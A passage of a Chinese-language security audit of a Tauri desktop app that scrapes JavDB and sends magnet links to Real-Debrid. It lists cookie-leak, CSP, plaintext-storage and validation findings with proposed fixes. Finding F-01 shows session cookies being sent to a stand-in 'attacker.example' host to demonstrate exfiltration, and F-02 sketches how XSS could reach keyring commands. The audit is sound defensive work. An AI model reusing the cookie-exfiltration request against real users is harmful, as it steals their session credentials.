## 3. 確認後 Findings

### 3.1 Medium 風險（建議優先處理）

#### F-01 [Medium・Codex 已驗證]　`fetch_javdb` 未限制網域，cookies 會跟著任意 HTTPS URL 外送

- **證據**
  - `sidecar/sidecar.py:259-269`（`cmd_fetch_javdb` 只檢查 `url.startswith("https://")`）
  - `javdb_scraper.py:78-79`（`session.get(url, cookies=cookies, timeout=30)`）
  - `sidecar/sidecar.py:106-117`（`parse_cookie_string` 產出無 domain 屬性的 dict）

- **Codex 複查結論**
  > 「以 requests 2.32.x 本地實測：把 `cookies={"_jdb_session": "x", "cf_clearance": "y"}` 傳給 `Session.get('https://attacker.example/...')`，所有 cookie 都會在 `Cookie:` header 中送出。**`cookies=dict` 不會依 host 過濾**——CWE-200 / CWE-540 風險成立。」

- **影響**
  使用者只要被誘導貼入非 javdb.com 的 HTTPS URL（釣魚、剪貼簿污染、未來自動匯入），即可外洩 Cloudflare clearance + JavDB session cookie。

- **建議修法**
  在 `cmd_fetch_javdb` 內加上 host allowlist：
  ```python
  from urllib.parse import urlparse
  host = (urlparse(url).hostname or "").lower()
  if not (host == "javdb.com" or host.endswith(".javdb.com")):
      return _err(req, "bad_request", "url host not allowed")
  ```
  或改用 `requests.cookies.RequestsCookieJar` 並指定 `domain="javdb.com"`，讓 requests 自行依 host 決定附帶與否。

---

#### F-02 [Medium]　Tauri WebView 未設定 CSP

- **證據**
  `app/src-tauri/tauri.conf.json:23-25`：
  ```json
  "security": { "csp": null }
  ```

- **說明**
  目前前端使用 Svelte 預設轉義，未發現 `{@html}` / `eval` / `Function()` 使用，**尚無立即可利用 XSS**。但缺乏 CSP 等於失去深度防禦：未來新增富文字渲染、第三方 widget、或誤用 `{@html}` 時，XSS payload 即可透過 `invoke("rd_save_token", …)`、`invoke("copy_magnet", …)` 操作 keyring 與剪貼簿。

- **建議修法**
  Production build 啟用 Tauri 2 推薦 CSP：
  ```
  "csp": "default-src 'self'; connect-src 'self' ipc: https://ipc.localhost; img-src 'self' data:; style-src 'self' 'unsafe-inline'"
  ```
  需先確認既有 UI 無 inline `<script>` 或外部資產，再決定是否進一步收緊。

---

#### F-03 [Medium]　`cookies.txt` 仍為明文落地

- **證據**
  - `app/src-tauri/src/secret_store.rs:14-15`（檔頭註解：「DPAPI move tracked for M6/M7」）
  - 預設位置：`%APPDATA%\JavDBMagnet\cookies.txt`

- **說明**
  RD API token 已遷至 Windows Credential Manager（良好），但 JavDB cookies (cf_clearance、_jdb_session) 仍為明文檔，於下列情境會直接外洩：
  1. 多使用者機器
  2. `%APPDATA%` 被 OneDrive 重定向 / 同步
  3. 系統備份 / 影像外流

  正向觀察：`commands.rs:917` 的 cookies.txt 範本已內含「勿同步雲端」提醒。

- **建議修法**
  - **首選**：透過 DPAPI（`CryptProtectData`）封裝後落地，使用者範圍 (`CRYPTPROTECT_UI_FORBIDDEN`)。
  - **替代**：以 keyring 存放（`SERVICE=JavDBMagnet, ACCOUNT=JAVDB_COOKIES`），但須注意 cookies 長度與更新頻率比 token 高。

### 3.2 Low 風險（後續硬化）

#### F-04 [Low]　`rd_set_token` / `rd_save_token` 未驗證 token 字串格式或長度

- **證據**：`sidecar/sidecar.py:518-528`、`app/src-tauri/src/commands.rs:314-332`
- **建議**：Rust 側收到後檢查 `token.len() < 256 && token.chars().all(|c| c.is_ascii_alphanumeric())`，否則 `Err("rd_token_format_invalid")`。

#### F-05 [Low]　`parse_cookie_string` 對畸形 / CRLF 內容缺嚴格驗證

- **證據**：`sidecar/sidecar.py:106-117`
- **建議**：含 `\r` 或 `\n` 的 KV pair 直接捨棄；屬深度防禦。

#### F-06 [Low]　Legacy `load_env` (Python) 仍存在於 `realdebrid.py:20-33`

- **說明**：M5 後 sidecar 走 handshake，但函式未刪除；建議加 deprecation 註解或移除，避免未來被誤呼叫造成設定汙染。

#### F-14 [Low]　Tauri 能力 `shell:allow-open` 範圍可再縮小

- **證據**：`app/src-tauri/capabilities/default.json:7-15`
- **建議**：前端目前僅開啟 `https://real-debrid.com/apitoken`，可將 allow 條件由 `https://real-debrid.com/*` 改為精確 path，降低未來誤用面。

#### F-15 [Low]　`withGlobalTauri: false` 已正確設定，但仍須補 CSP

- 詳見 F-02；本項僅為交叉確認。

#### F-17 [Low]　`cmd_rd_set_token` 未要求 `handshake_done`

- **證據**：`sidecar/sidecar.py:518-528` vs `:541`（`cmd_rd_send_magnet` 已 gate）
- **影響**：桌面 app 場景中 stdin/stdout pipe 由 Tauri 獨佔，無實際可利用面；屬深度防禦。
- **建議**：對齊 `cmd_rd_send_magnet`，於進入點加 `if not state.handshake_done: return _err(...)`。

## 5. 建議修法優先順序

### Priority 1（短期內處理，建議下個 milestone 完成）

1. **F-01**：在 `cmd_fetch_javdb` 加上 javdb.com host allowlist，或改用 `RequestsCookieJar` 設定 `domain`。
   - 工作量：小（< 10 行 Python + 單元測試）
   - 風險：Codex 已驗證，且修補不影響任何 happy path

### Priority 2（中期硬化，下下個 milestone 或併 M6/M7 一起做）

2. **F-03**：將 cookies.txt 改以 DPAPI 或 keyring 儲存（與既有 roadmap 一致）。
   - 工作量：中（需處理現有檔案遷移）
3. **F-02**：開啟 Tauri CSP；先測試現有 UI 是否相容，再決定是否需要 `'unsafe-inline'` 例外。
   - 工作量：中（主要是測試成本）

### Priority 3（深度防禦，可順手處理）

4. **F-04**：token 長度 / 字元集驗證
5. **F-05**：cookie parser 拒絕含 CR/LF 的 pair
6. **F-17**：`cmd_rd_set_token` 補上 `handshake_done` gate
7. **F-14**：`shell:allow-open` 收斂為精確 path

### Priority 4（清潔工作）

8. **F-06**：移除或註解 legacy `realdebrid.py:load_env`
9. **F-12 補追蹤事項**：建立例行流程定期升級 PyPI pin（certifi / urllib3 / charset-normalizer），避免長期落後最新版

## 6. 結論

JavDBMagnet 整體在敏感資料分層（RD token → keyring；pending JSON 結構性排除 magnet；sidecar IPC redaction）與**供應鏈硬化（SHA-pin GitHub Actions、pinned pip、`--ignore-scripts`）**的實作品質**高於同類桌面 app 平均**，並且既有設計已透過單元測試守住關鍵不變式（無 magnet 文字、無 token 流入 settings.json）。

**主要殘留風險集中在 3 個 Medium 項**：

1. **F-01**（Codex 已驗證）：JavDB cookies 對非 javdb host 不過濾——**建議優先修補**。
2. **F-02**：Tauri WebView 無 CSP，深度防禦缺口。
3. **F-03**：cookies.txt 明文落地——已在 M6/M7 roadmap，可按計畫推進。

其餘 6 項 Low 與 8 項 Info 均為硬化建議或既有良好實作的紀錄，**不阻擋發佈**。

本次審查**未修改任何原始碼、設定檔或依賴檔**；僅新增本報告與草稿作為交付物。後續修補請另闢分支處理並對應 F-XX 編號於 commit message 中。
